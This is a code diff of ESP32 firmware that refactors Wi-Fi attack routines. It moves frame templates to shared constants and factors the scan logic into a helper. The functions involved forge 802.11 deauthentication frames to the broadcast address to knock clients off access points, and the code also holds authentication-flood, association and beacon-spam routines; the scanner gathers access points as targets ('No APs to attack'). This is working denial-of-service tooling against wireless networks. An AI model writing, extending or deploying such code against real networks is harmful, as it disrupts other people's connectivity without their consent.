@@ -54,20 +54,21 @@ void nx::wifi::setBandChannel(uint8_t channel){
   delay(10);
 }
 
+// IEEE 802.11 deauthentication frame template with reason code 7 (Class 3 frame received from nonassociated STA)
+static const uint8_t deauthFrameTemplate[26] PROGMEM = {
+  0xC0, 0x00, 0x3A, 0x01,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00,
+  0x07, 0x00
+};
+
 void nx::wifi::txDeauthFrameAll(){
   if(channelAPMap.empty()){
     debug_print("No APs to attack");
     return;
   }
-  
-  static const uint8_t deauthFrame[26] PROGMEM = {
-    0xC0, 0x00, 0x3A, 0x01,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x07, 0x00
-  };
   
   for(auto& entry : channelAPMap){
     uint8_t channel = entry.first;
@@ -78,7 +79,7 @@ void nx::wifi::txDeauthFrameAll(){
     
     for(auto& bssidInfo : bssids){
       uint8_t pkt[26];
-      memcpy_P(pkt, deauthFrame, 26);
+      memcpy_P(pkt, deauthFrameTemplate, 26);
       memcpy(&pkt[10], bssidInfo.bssid.data(), 6);
       memcpy(&pkt[16], bssidInfo.bssid.data(), 6);
       
@@ -93,15 +94,6 @@ void nx::wifi::txDeauthFrameChannel(uint8_t channel){
     return;
   }
   
-  static const uint8_t deauthFrame[26] PROGMEM = {
-    0xC0, 0x00, 0x3A, 0x01,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x07, 0x00
-  };
-  
   auto& bssids = channelAPMap[channel];
   if(bssids.empty()) return;
   
@@ -109,7 +101,7 @@ void nx::wifi::txDeauthFrameChannel(uint8_t channel){
   
   for(auto& bssidInfo :  bssids){
     uint8_t pkt[26];
-    memcpy_P(pkt, deauthFrame, 26);
+    memcpy_P(pkt, deauthFrameTemplate, 26);
     memcpy(&pkt[10], bssidInfo.bssid.data(), 6);
     memcpy(&pkt[16], bssidInfo.bssid.data(), 6);
     
@@ -123,19 +115,10 @@ void nx::wifi::txDeauthFrameBSSID(const uint8_t* bssid, uint8_t channel){
     return;
   }
   
-  static const uint8_t deauthFrame[26] PROGMEM = {
-    0xC0, 0x00, 0x3A, 0x01,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x07, 0x00
-  };
-  
   setBandChannel(channel);
   
   uint8_t pkt[26];
-  memcpy_P(pkt, deauthFrame, 26);
+  memcpy_P(pkt, deauthFrameTemplate, 26);
   memcpy(&pkt[10], bssid, 6);
   memcpy(&pkt[16], bssid, 6);
   
@@ -218,48 +201,47 @@ void nx::wifi::txBeaconFrame(const char* ssid, uint8_t channel, const uint8_t* b
   for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, idx, false);
 }
 
+// Authentication frame templates for 2.4GHz and 5GHz bands - shared across auth functions
+static const uint8_t authTemplate2G[30] PROGMEM = {
+  0xB0, 0x00,                          // Frame Control 
+  0x3A, 0x01,                          // Duration
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+  0x00, 0x00,                          // Sequence
+  0x00, 0x00,                          // Auth algorithm (Open System)
+  0x01, 0x00,                          // Auth sequence
+  0x00, 0x00                           // Status code
+};
+
+static const uint8_t authTemplate5G[30] PROGMEM = {
+  0xB0, 0x00,                          // Frame Control
+  0x3A, 0x01,                          // Duration
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+  0x00, 0x00,                          // Sequence
+  0x00, 0x00,                          // Auth algorithm (Open System)
+  0x01, 0x00,                          // Auth sequence
+  0x00, 0x00                           // Status code
+};
+
+// HT Capabilities - shared across auth and assoc functions
+static const uint8_t htCapabilities[28] PROGMEM = {
+  0x2D, 0x1A,                          // Tag:  HT Capabilities, Length: 26
+  0xEF, 0x09,                          // HT Capabilities Info
+  0x17,                                 // A-MPDU Parameters
+  0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MCS Set
+  0x00, 0x00,                          // HT Extended Capabilities
+  0x00, 0x00, 0x00, 0x00,             // Transmit Beamforming
+  0x00                                 // ASEL Capabilities
+};
+
 void nx::wifi::txAuthFrame(const uint8_t* bssid, uint8_t channel){
   if(bssid == nullptr) return;
   
   bool is5GHz = (channel > 14);
-  
-  // 2.4GHz Authentication Frame
-  static const uint8_t authTemplate2G[30] PROGMEM = {
-    0xB0, 0x00,                          // Frame Control 
-    0x3A, 0x01,                          // Duration
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination 
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source 
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-    0x00, 0x00,                          // Sequence
-    0x00, 0x00,                          // Auth algorithm (Open System)
-    0x01, 0x00,                          // Auth sequence
-    0x00, 0x00                           // Status code
-  };
-  
-  // 5GHz Authentication Frame
-  static const uint8_t authTemplate5G[30] PROGMEM = {
-    0xB0, 0x00,                          // Frame Control
-    0x3A, 0x01,                          // Duration
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-    0x00, 0x00,                          // Sequence
-    0x00, 0x00,                          // Auth algorithm (Open System)
-    0x01, 0x00,                          // Auth sequence
-    0x00, 0x00                           // Status code
-  };
-  
-  // HT Capabilities for 5GHz
-  static const uint8_t htCapabilities[28] PROGMEM = {
-    0x2D, 0x1A,                          // Tag:  HT Capabilities, Length: 26
-    0xEF, 0x09,                          // HT Capabilities Info
-    0x17,                                 // A-MPDU Parameters
-    0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MCS Set
-    0x00, 0x00,                          // HT Extended Capabilities
-    0x00, 0x00, 0x00, 0x00,             // Transmit Beamforming
-    0x00                                 // ASEL Capabilities
-  };
   
   uint8_t pkt[128];
   int pktLen;
@@ -299,6 +281,53 @@ void nx::wifi::txAuthFlood(){
   }
 }
 
+// Association request frame templates for 2.4GHz and 5GHz bands - shared
+static const uint8_t assocTemplate2G[28] PROGMEM = {
+  0x00, 0x00,                          // Frame Control
+  0x3A, 0x01,                          // Duration
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+  0x00, 0x00,                          // Sequence
+  0x01, 0x04,                          // Capability (ESS)
+  0x0A, 0x00                           // Listen interval
+};
+
+static const uint8_t assocTemplate5G[28] PROGMEM = {
+  0x00, 0x00,                          // Frame Control
+  0x3A, 0x01,                          // Duration
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+  0x00, 0x00,                          // Sequence
+  0x01, 0x04,                          // Capability
+  0x0A, 0x00                           // Listen interval
+};
+
+// Supported rates
+static const uint8_t rates2G[10] PROGMEM = {
+  0x01, 0x08,                          // Tag: Supported Rates, Length: 8
+  0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
+};
+
+static const uint8_t rates5G[10] PROGMEM = {
+  0x01, 0x08,                          // Tag: Supported Rates, Length: 8
+  0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C
+};
+
+// VHT Capabilities for 5GHz 
+static const uint8_t vhtCapabilities[14] PROGMEM = {
+  0xBF, 0x0C,                          // Tag: VHT Capabilities, Length: 12
+  0x32, 0x00, 0x80, 0x03,             // VHT Capabilities Info
+  0xFA, 0xFF, 0x00, 0x00,             // Supported MCS Set
+  0xFA, 0xFF, 0x00, 0x00              // Supported MCS Set 
+};
+
+static const uint8_t extCapabilities[10] PROGMEM = {
+  0x7F, 0x08,                          // Tag: Extended Capabilities, Length: 8
+  0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
+};
+
 void nx::wifi::txAssocFrame(const uint8_t* bssid, const char* ssid, uint8_t channel){
   if(bssid == nullptr || ssid == nullptr) return;
   
@@ -306,67 +335,6 @@ void nx::wifi::txAssocFrame(const uint8_t* bssid, const char* ssid, uint8_t chan
   if(ssidLen > 32) ssidLen = 32;
   
   bool is5GHz = (channel > 14);
-  
-  // 2.4GHz Association Request
-  static const uint8_t assocTemplate2G[28] PROGMEM = {
-    0x00, 0x00,                          // Frame Control
-    0x3A, 0x01,                          // Duration
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination 
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source 
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-    0x00, 0x00,                          // Sequence
-    0x01, 0x04,                          // Capability (ESS)
-    0x0A, 0x00                           // Listen interval
-  };
-  
-  // 5GHz Association Request
-  static const uint8_t assocTemplate5G[28] PROGMEM = {
-    0x00, 0x00,                          // Frame Control
-    0x3A, 0x01,                          // Duration
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-    0x00, 0x00,                          // Sequence
-    0x01, 0x04,                          // Capability
-    0x0A, 0x00                           // Listen interval
-  };
-  
-  // Supported rates
-  static const uint8_t rates2G[10] PROGMEM = {
-    0x01, 0x08,                          // Tag: Supported Rates, Length: 8
-    0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
-  };
-  
-  // Supported rates
-  static const uint8_t rates5G[10] PROGMEM = {
-    0x01, 0x08,                          // Tag: Supported Rates, Length: 8
-    0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C
-  };
-  
-  // HT Capabilities for both bands 
-  static const uint8_t htCapabilities[28] PROGMEM = {
-    0x2D, 0x1A,                          // Tag: HT Capabilities, Length: 26
-    0xEF, 0x09,                          // HT Capabilities Info
-    0x17,                                 // A-MPDU Parameters
-    0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MCS Set
-    0x00, 0x00,                          // HT Extended Capabilities
-    0x00, 0x00, 0x00, 0x00,             // Transmit Beamforming
-    0x00                                 // ASEL Capabilities
-  };
-  
-  // VHT Capabilities for 5GHz 
-  static const uint8_t vhtCapabilities[14] PROGMEM = {
-    0xBF, 0x0C,                          // Tag: VHT Capabilities, Length: 12
-    0x32, 0x00, 0x80, 0x03,             // VHT Capabilities Info
-    0xFA, 0xFF, 0x00, 0x00,             // Supported MCS Set
-    0xFA, 0xFF, 0x00, 0x00              // Supported MCS Set 
-  };
-  
-  static const uint8_t extCapabilities[10] PROGMEM = {
-    0x7F, 0x08,                          // Tag: Extended Capabilities, Length: 8
-    0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40
-  };
   
   uint8_t pkt[256];
   int idx;
@@ -448,6 +416,44 @@ void nx::wifi::init(){
   currentChannel = 0;
   debug_print("WiFi init success");
 }
+
+void nx::wifi::processScanResults(int scanCount, uint8_t channel, int& totalScan, bool verbose) {
+  if(scanCount <= 0) return;
+  
+  for(int i = 0; i < scanCount; i++){
+    const uint8_t* bssid = WiFi.BSSID(i);
+    String ssid = WiFi.SSID(i);
+    wifi_auth_mode_t authMode = WiFi.encryptionType(i);
+    bool encrypted = (authMode != WIFI_AUTH_OPEN);
+    
+    BSSIDInfo newBSSID(bssid, ssid.c_str(), encrypted);
+    
+    bool duplicate = false;
+    if(channelAPMap.find(channel) != channelAPMap.end()){
+      for(auto& stored : channelAPMap[channel]){
+        if(stored == newBSSID){
+          duplicate = true;
+          break;
+        }
+      }
+    }
+    
+    if(!duplicate){
+      channelAPMap[channel].push_back(newBSSID);
+      totalAPCount++;
+      
+      if(verbose){
+        Serial.printf("[WIFI] Ch %d:  %s (%02X:%02X:%02X:%02X:%02X:%02X) %s\n", 
+                      channel, 
+                      newBSSID.ssid.empty() ? "<Hidden>" : newBSSID.ssid.c_str(),
+                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+                      encrypted ? "[ENC]" : "[OPEN]");
+      }
+    }
+  }
+  totalScan += scanCount;
+}
+
 int nx::wifi::scanNetwork(bool all, uint8_t channel){
   WiFi.scanDelete();
   int totalScan = 0;
@@ -460,73 +466,14 @@ int nx::wifi::scanNetwork(bool all, uint8_t channel){
   if(! all && channel != 0){
     setBandChannel(channel);
     int scan = WiFi.scanNetworks(false, true, false, 500, channel);
-    
-    if(scan > 0){
-      for(int i = 0; i < scan; i++){
-        const uint8_t* bssid = WiFi.BSSID(i);
-        String ssid = WiFi.SSID(i);
-        
-        wifi_auth_mode_t authMode = WiFi.encryptionType(i);
-        bool encrypted = (authMode != WIFI_AUTH_OPEN);
-        
-        BSSIDInfo newBSSID(bssid, ssid.c_str(), encrypted);
-        
-        bool duplicate = false;
-        if(channelAPMap.find(channel) != channelAPMap.end()){
-          for(auto& stored : channelAPMap[channel]){
-            if(stored == newBSSID){
-              duplicate = true;
-              break;
-            }
-          }
-        }
-        
-        if(!duplicate){
-          channelAPMap[channel].push_back(newBSSID);
-          totalAPCount++;
-          
-          Serial.printf("[WIFI] Ch %d:  %s (%02X:%02X:%02X:%02X:%02X:%02X) %s\n", 
-                        channel, 
-                        newBSSID.ssid.empty() ? "<Hidden>" : newBSSID.ssid.c_str(),
-                        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-                        encrypted ? "[ENC]" : "[OPEN]");
-        }
-      }
-      totalScan = scan;
-    }
+    processScanResults(scan, channel, totalScan, true);
   }
   else{
     for(size_t i = 0; i < channelCount; i++){
       uint8_t ch = channelList[i];
       setBandChannel(ch);
       int scan = WiFi.scanNetworks(false, true, false, 500, ch);
-      
-      if(scan > 0){
-        for(int j = 0; j < scan; j++){
-          const uint8_t* bssid = WiFi.BSSID(j);
-          String ssid = WiFi.SSID(j);
-          wifi_auth_mode_t authMode = WiFi.encryptionType(j);
-          bool encrypted = (authMode != WIFI_AUTH_OPEN);
-          
-          BSSIDInfo newBSSID(bssid, ssid.c_str(), encrypted);
-          
-          bool duplicate = false;
-          if(channelAPMap.find(ch) != channelAPMap.end()){
-            for(auto& stored : channelAPMap[ch]){
-              if(stored == newBSSID){
-                duplicate = true;
-                break;
-              }
-            }
-          }
-          
-          if(!duplicate){
-            channelAPMap[ch].push_back(newBSSID);
-            totalAPCount++;
-          }
-        }
-        totalScan += scan;
-      }
+      processScanResults(scan, ch, totalScan, false);
     }
   }
   
